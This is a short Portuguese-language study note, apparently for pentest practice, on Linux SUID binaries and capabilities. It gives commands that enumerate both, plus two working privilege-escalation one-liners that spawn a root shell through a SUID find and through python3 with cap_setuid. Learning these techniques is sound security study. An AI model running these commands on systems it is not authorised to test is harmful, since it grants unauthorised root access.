101/permissions/today.org
#+title: SUIDs e Capabilities
#+author:gabriel

* SUID

É atribuído a um arquivo binário com permissão de execução, quando desejamos que um usuário qualquer execute o comando com as permissões do user owner do comando (Root)

*buscando por SUIDs no sistema* -->
#+begin_src sh
find / -type f -perm -4000 -ls 2>/dev/null
#+end_src

o próprio comando *find* pode ser utilizado para escalada de privs caso possua o SETUID -->
#+begin_src sh
find . -exec /bin/sh -p \; -quit

# whoami
root
#+end_src

* Capabilities
o programa binário adquire todas as permissões do proprietário (geralmente root) durante a execução. Isso é um risco de segurança, pois um programa comprometido ganha poder total de root.

*busca por capabilities* -->
#+begin_src sh
/usr/sbin/getcap -r / 2>/dev/null
#+end_src

Após encontrar o python3 com a cap_setuid=ep, a escalada de privilégios pode ocorrer da seguinte forma -->
#+begin_src sh
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# whoami
root
#+end_src
